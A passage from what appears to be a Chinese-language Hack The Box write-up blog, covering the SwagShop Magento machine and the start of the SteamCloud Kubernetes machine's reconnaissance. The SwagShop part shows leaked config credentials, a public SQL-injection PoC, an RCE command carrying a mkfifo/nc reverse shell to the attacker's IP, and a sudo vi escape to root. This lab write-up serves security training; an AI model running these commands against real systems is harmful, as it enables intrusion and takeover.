class="hljs-number">58</span>:<span class="hljs-number">16</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">312</span>B  - <span class="hljs-regexp">/shell  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>shell/            <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">16</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/shell/</span>                                           <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">16</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">311</span>B  - <span class="hljs-regexp">/skin  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>skin/              <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">310</span>B  - <span class="hljs-regexp">/var  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>var/                <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/var/</span>                                             <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">755</span>B  - <span class="hljs-regexp">/var/</span>backups/<br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">4</span>KB - <span class="hljs-regexp">/var/</span>cache/                                       <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">9</span>KB - <span class="hljs-regexp">/var/</span>package/                                           <br></code></pre></td></tr></table></figure><p>我找到了它的配置文件，其中有条像是具体版本号的东西:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/app/</span>code<span class="hljs-regexp">/community/</span>Phoenix<span class="hljs-regexp">/Moneybookers/</span>etc/config.xml<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;version&gt;</span><span class="hljs-attribute">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>&lt;/version&gt;<br></code></pre></td></tr></table></figure><p>我又发现了一个xml文件，它的时间有些不同，还有一个奇怪的key：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/app/</span>etc/local.xml<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">config</span>&gt;<br><span class="hljs-section">&lt;global&gt;</span><br><span class="hljs-section">&lt;install&gt;</span><br><span class="hljs-section">&lt;date&gt;</span><span class="hljs-attribute">Wed</span>, <span class="hljs-number">08</span> May <span class="hljs-number">2019</span> <span class="hljs-number">07</span>:<span class="hljs-number">23</span>:<span class="hljs-number">09</span> +<span class="hljs-number">0000</span>&lt;/date&gt;<br><span class="hljs-section">&lt;/install&gt;</span><br><span class="hljs-section">&lt;crypt&gt;</span><br><span class="hljs-section">&lt;key&gt;</span><span class="hljs-attribute">b355a9e0cd018d3f7f03607141518419</span>&lt;/key&gt;<br></code></pre></td></tr></table></figure><p>我好像还看到了mysql数据库root用户的密码，但是目标并没有开放数据库端口让我远程链接：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">connection</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">host</span>&gt;</span>localhost<span class="hljs-tag">&lt;/<span class="hljs-name">host</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>fMVWh7bDHpgZkyfqQXreTjU9<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dbname</span>&gt;</span>swagshop<span class="hljs-tag">&lt;/<span class="hljs-name">dbname</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">initStatements</span>&gt;</span>SET NAMES utf8<span class="hljs-tag">&lt;/<span class="hljs-name">initStatements</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">model</span>&gt;</span>mysql4<span class="hljs-tag">&lt;/<span class="hljs-name">model</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pdo_mysql<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">pdoType</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">pdoType</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或许可以去ssh试一下，不出意外的并不行：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">This <span class="hljs-keyword">key</span> <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> known <span class="hljs-keyword">by</span> any other names<br>Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> connecting (yes/no/[fingerprint])? yes<br><span class="hljs-symbol">Warning:</span> Permanently added <span class="hljs-comment">&#x27;10.10.10.140&#x27; (ED25519) to the list of known hosts.</span><br>root@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.140</span><span class="hljs-comment">&#x27;s password: </span><br>Permission denied, please <span class="hljs-keyword">try</span> again.<br>root@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.140</span><span class="hljs-comment">&#x27;s password: </span><br></code></pre></td></tr></table></figure><p>还有看起来像是计划任务的脚本cron.sh，但抱歉它是空的。还有它的安装脚本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>swagshop.htb/install.php<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408171229322.png" alt="image-20220408171229322"  /><p>我还发现一些这样的东西：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408171324831.png" alt="image-20220408171324831"  /><p>大概浏览了一下，收获颇丰，还有目标看起来像是管理员登陆的页面，但是它又显示了另一个时间2022：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/index.php/</span>admin/<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408174413490.png" alt="image-20220408174413490"  /><p>我想先试着寻找已经公开的漏洞：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs coq">searchsploit Magento<br>--------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                             |  <span class="hljs-type">Path</span><br>--------------------------------------------------------------------------- ---------------------------------<br>eBay Magento <span class="hljs-number">1.9</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span> - PHP FPM XML eXternal Entity Injection               | <br><span class="hljs-type">eBay</span> Magento CE <span class="hljs-number">1.9</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span> - Unrestricted Cron <span class="hljs-keyword">Script</span> (Code Execution / Denia | <br><span class="hljs-type">Magento</span> <span class="hljs-number">1.2</span> - &#x27;/app/code/core/Mage/Admin/Model/Session.php?login[&#x27;Username | <br><span class="hljs-type">Magento</span> <span class="hljs-number">1.2</span> - &#x27;/app/code/core/Mage/Adminhtml/controllers/IndexController.p | <br><span class="hljs-type">Magento</span> <span class="hljs-number">1.2</span> - &#x27;downloader/index.php&#x27; Cross-Site Scripting                  | <br><span class="hljs-type">Magento</span> &lt; <span class="hljs-number">2.0</span><span class="hljs-number">.6</span> - Arbitrary Unserialize / Arbitrary Write <span class="hljs-keyword">File</span>             | <br><span class="hljs-type">Magento</span> CE &lt; <span class="hljs-number">1.9</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> - (Authenticated) Remote Code Execution               | <br><span class="hljs-type">Magento</span> eCommerce - <span class="hljs-keyword">Local</span> <span class="hljs-keyword">File</span> Disclosure                                  | <br><span class="hljs-type">Magento</span> eCommerce - Remote Code Execution                                  | <br><span class="hljs-type">Magento</span> Server MAGMI Plugin - Multiple Vulnerabilities                     | <br><span class="hljs-type">Magento</span> Server MAGMI Plugin <span class="hljs-number">0.7</span><span class="hljs-number">.17</span>a - Remote <span class="hljs-keyword">File</span> Inclusion                | <br><span class="hljs-type">Magento</span> WooCommerce CardGate Payment Gateway <span class="hljs-number">2.0</span><span class="hljs-number">.30</span> - Payment Process Bypa | <br><span class="hljs-type">--------------------------------------------------------------------------- ---------</span><br></code></pre></td></tr></table></figure><p>诱惑力最大的永远都是远程代码执行：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Magento</span> eCommerce - Remote <span class="hljs-meta">Code</span> Execution <br></code></pre></td></tr></table></figure><p>该<code>Magento eCommerce - Remote Code Execution</code>漏洞利用创建一个新的管理员帐户<code>forme/forme</code>作为凭据。我只需要修改目标并启动它以获得管理员帐户，这是它的利用脚本，当然searchploit的也可以用，但是 需要自己去改：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/joren485/</span>Magento-Shoplift-SQLI<span class="hljs-regexp">/blob/m</span>aster/poc.py<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> poc.py <span class="hljs-number">10.10.10.140</span><br><span class="hljs-attribute">WORKED</span><br><span class="hljs-attribute">Check</span> http://<span class="hljs-number">10.10.10.140</span>/admin with creds ypwq:<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>该漏洞其实就是一个SQL注入：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408203043733.png" alt="image-20220408203043733"  /><p>就这样，我便拿到了目标后台权限：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408202624449.png" alt="image-20220408202624449"  /><p>接下来我需要使用另一个漏洞进行远程代码执行，</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Magento</span> CE &lt; <span class="hljs-number">1.9.0.1</span> - (Authenticated) Remote Code Execution<br></code></pre></td></tr></table></figure><p>searchsploit提供的漏洞利用脚本会出现一些错误，我开发功底其实很差，我还看不懂，但网上很多wp写的都是直接利用成功的，可能哪里更新了年代不一样了吧。我花了很多时间找到了如下文章，它与我遇到的问题是一样的，但是他细分析了很多原因细节并解决掉了该问题，如有需要可自行去查看：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://dtwh.medium.com/hack-<span class="hljs-keyword">the</span>-box-swagshop-walkthrough-<span class="hljs-keyword">without</span>-metasploit<span class="hljs-number">-8</span>b9f03c480e7<br></code></pre></td></tr></table></figure><p>获取到漏洞利用脚本需要对其内部参数值进行一些更改：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># Config.</span><br><span class="hljs-attr">username</span> = <span class="hljs-string">&#x27;try&#x27;</span> <span class="hljs-comment">#用户名</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&#x27;again&#x27;</span> <span class="hljs-comment">#密码</span><br><span class="hljs-attr">php_function</span> = <span class="hljs-string">&#x27;system&#x27;</span>  <span class="hljs-comment"># <span class="hljs-doctag">Note:</span> we can only pass 1 argument to the function</span><br><span class="hljs-attr">install_date</span> = <span class="hljs-string">&#x27;Wed, 08 May 2019 07:23:09 +0000&#x27;</span>  <span class="hljs-comment">#时间 This needs to be the exact date from /app/etc/local.xml </span><br></code></pre></td></tr></table></figure><p>时间可通过以下命令获取到目标页面的时间：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">curl -s 10.10.10.140/app/etc/local.xml | grep date<br>            <span class="hljs-tag">&lt;<span class="hljs-name">date</span>&gt;</span>&lt;![CDATA[Wed, 08 May 2019 07:23:09 +0000]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">date</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后我可以执行如下命令，使目标建立一个反向shell：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n2</span> poc.py <span class="hljs-string">&#x27;http://10.10.10.140/index.php/admin&#x27;</span> <span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.3 1337 &gt;/tmp/f&quot;</span><br></code></pre></td></tr></table></figure><p>另一边监听对应端口即可：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">1337</span><br>listening <span class="hljs-literal">on</span> [any] <span class="hljs-number">1337</span> ...<br>connect to [<span class="hljs-number">10.10.16.3</span>] from (UNKNOWN) [<span class="hljs-number">10.10.10.140</span>] <span class="hljs-number">45610</span><br>sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br></code></pre></td></tr></table></figure><p>升级下shell：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>sudo -l 告诉了我些信息：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@swagshop</span><span class="hljs-symbol">:/var/www/html</span><span class="hljs-variable">$ </span>sudo -l<br>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> www-data on <span class="hljs-symbol">swagshop:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br><span class="hljs-title class_">User</span> www-data may run the following commands on <span class="hljs-symbol">swagshop:</span><br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/vi /var/www/html/*<br></code></pre></td></tr></table></figure><p>而编辑器中可以切换跳转到当前身份的shell，我可以用以下命令获取root shell：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/vi /</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/api.php -c &#x27;:!/</span>bin<span class="hljs-regexp">/sh&#x27; /</span>dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;/var/www/html/api.php&quot;</span> <span class="hljs-number">88</span>L, <span class="hljs-number">2834</span>C<br>:!<span class="hljs-regexp">/bin/</span>sh<br><span class="hljs-comment"># whoami</span><br>whoami<br>root<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>user.txt：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@swagshop</span><span class="hljs-symbol">:/home/haris</span><span class="hljs-comment"># cat user.txt</span><br>cat user.txt<br>a4.............................<br></code></pre></td></tr></table></figure><p>root.txt:</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">root<span class="hljs-meta">@swagshop:~#</span> cat root.txt<br>cat root.txt<br>c2b087.........................<br><br>   ___ ___<br> /|<span class="hljs-string"> </span>|<span class="hljs-string">/</span>|<span class="hljs-string">\</span>|<span class="hljs-string"> </span>|<span class="hljs-string">\</span><br><span class="hljs-string">/_</span>|<span class="hljs-string"> ´ </span>|<span class="hljs-string">.` </span>|<span class="hljs-string">_\           We are open! (Almost)</span><br><span class="hljs-string">  </span>|<span class="hljs-string">   </span>|<span class="hljs-string">.  </span>|<br>  |<span class="hljs-string">   </span>|<span class="hljs-string">.  </span>|<span class="hljs-string">         Join the beta HTB Swag Store!</span><br><span class="hljs-string">  </span>|<span class="hljs-string">___</span>|<span class="hljs-string">.__</span>|<span class="hljs-string">       https://hackthebox.store/password</span><br><span class="hljs-string"></span><br><span class="hljs-string">                   PS: Use root flag as password!</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - SteamCloud</title>
    <link href="/post/HackTheBox-SteamCloud.html"/>
    <url>/post/HackTheBox-SteamCloud.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h4><h5 id="masscan："><a href="#masscan：" class="headerlink" title="masscan："></a>masscan：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.133 --rate 2000 -e tun0<br>[sudo] mosaictheory 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-14 10:02:32 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.11.133                                    <br>Discovered open port 2379/tcp on 10.10.11.133                                  <br>Discovered open port 10256/tcp on 10.10.11.133                                 <br>Discovered open port 8443/tcp on 10.10.11.133                                  <br>Discovered open port 10249/tcp on 10.10.11.133                                 <br>Discovered open port 10250/tcp on 10.10.11.133                                 <br>Discovered open port 2380/tcp on 10.10.11.133 <br></code></pre></td></tr></table></figure><h5 id="Nmap："><a href="#Nmap：" class="headerlink" title="Nmap："></a>Nmap：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo nmap -sC -sV -Pn 10.10.11.133 -p22,2379,10256,8443,10249,1250,2380<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.133<br>Host is up (0.33s latency).<br><br>PORT      STATE  SERVICE          VERSION<br>22/tcp    open   ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 <span class="hljs-built_in">fc</span>:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)<br>|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)<br>|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)<br>1250/tcp  closed swldy-sias<br>2379/tcp  open   ssl/etcd-client?<br>| ssl-cert: Subject: commonName=steamcloud<br>| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1<br>| Not valid before: 2022-05-14T10:02:00<br>|_Not valid after:  2023-05-14T10:02:00<br>| tls-alpn: <br>|_  h2<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>2380/tcp  open   ssl/etcd-server?<br>| tls-alpn: <br>|_  h2<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| ssl-cert: Subject: commonName=steamcloud<br>| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1<br>| Not valid before: 2022-05-14T10:02:00<br>|_Not valid after:  2023-05-14T10:02:01<br>8443/tcp  open   ssl/https-alt<br>| fingerprint-strings: <br>|   FourOhFourRequest: <br>|     HTTP/1.0 403 Forbidden<br>|     Audit-Id: 259e34c0-7408-465b-bb52-13e9b6c3a1bd<br>|     Cache-Control: no-cache, private<br>|     Content-Type: application/json<br>|     X-Content-Type-Options: nosniff<br>|     X-Kubernetes-Pf-Flowschema-Uid: 02934147-5409-4441-b7e6-6388d55f4dd4<br>|     X-Kubernetes-Pf-Prioritylevel-Uid: 87805fbd-eebb-4063-b814-3d599d9f6cca<br>|     Date: Sat, 14 May 2022 10:06:08 GMT<br>|     Content-Length: 212<br>|     &#123;<span class="hljs-string">&quot;kind&quot;</span>:<span class="hljs-string">&quot;Status&quot;</span>,<span class="hljs-string">&quot;apiVersion&quot;</span>:<span class="hljs-string">&quot;v1&quot;</span>,<span class="hljs-string">&quot;metadata&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;Failure&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;forbidden: User &quot;</span>system:anonymous<span class="hljs-string">&quot; cannot get path &quot;</span>/nice ports,/Trinity.txt.bak<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;reason&quot;</span>:<span class="hljs-string">&quot;Forbidden&quot;</span>,<span class="hljs-string">&quot;details&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;code&quot;</span>:403&#125;<br>|   GetRequest: <br>|     HTTP/1.0 403 Forbidden<br>|     Audit-Id: f6ce1760-50c1-44b5-8c1c-f24c8126a46c<br>|     Cache-Control: no-cache, private<br>|     Content-Type: application/json<br>|     X-Content-Type-Options: nosniff<br>|     X-Kubernetes-Pf-Flowschema-Uid: 02934147-5409-4441-b7e6-6388d55f4dd4<br>|     X-Kubernetes-Pf-Prioritylevel-Uid: 87805fbd-eebb-4063-b814-3d599d9f6cca<br>|     Date: Sat, 14 May 2022 10:06:05 GMT<br>|     Content-Length: 185<br>|     &#123;<span class="hljs-string">&quot;kind&quot;</span>:<span class="hljs-string">&quot;Status&quot;</span>,<span class="hljs-string">&quot;apiVersion&quot;</span>:<span class="hljs-string">&quot;v1&quot;</span>,<span class="hljs-string">&quot;metadata&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;Failure&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;forbidden: User &quot;</span>system:anonymous<span class="hljs-string">&quot; cannot get path &quot;</span>/<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;reason&quot;</span>:<span class="hljs-string">&quot;Forbidden&quot;</span>,<span class="hljs-string">&quot;details&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;code&quot;</span>:403&#125;<br>|   HTTPOptions: <br>|     HTTP/1.0 403 Forbidden<br>|     Audit-Id: 786acb3a-4dbc-4702-909f-b97968ee50a7<br>|     Cache-Control: no-cache, private<br>|     Content-Type: application/json<br>|     X-Content-Type-Options: nosniff<br>|     X-Kubernetes-Pf-Flowschema-Uid: 02934147-5409-4441-b7e6-6388d55f4dd4<br>|     X-Kubernetes-Pf-Prioritylevel-Uid: 87805fbd-eebb-4063-b814-3d599d9f6cca<br>|     Date: Sat, 14 May 2022 10:06:07 GMT<br>|     Content-Length: 189<br>|_    &#123;<span class="hljs-string">&quot;kind&quot;</span>:<span class="hljs-string">&quot;Status&quot;</span>,<span class="hljs-string">&quot;apiVersion&quot;</span>:<span class="hljs-string">&quot;v1&quot;</span>,<span class="hljs-string">&quot;metadata&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;Failure&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;forbidden: User &quot;</span>system:anonymous<span class="hljs-string">&quot; cannot options path &quot;</span>/<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;reason&quot;</span>:<span class="hljs-string">&quot;Forbidden&quot;</span>,<span class="hljs-string">&quot;details&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;code&quot;</span>:403&#125;<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (application/json).</span><br><span class="hljs-string">| tls-alpn: </span><br><span class="hljs-string">|   h2</span><br><span class="hljs-string">|_  http/1.1</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=minikube/organizationName=system:masters</span><br><span class="hljs-string">| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, 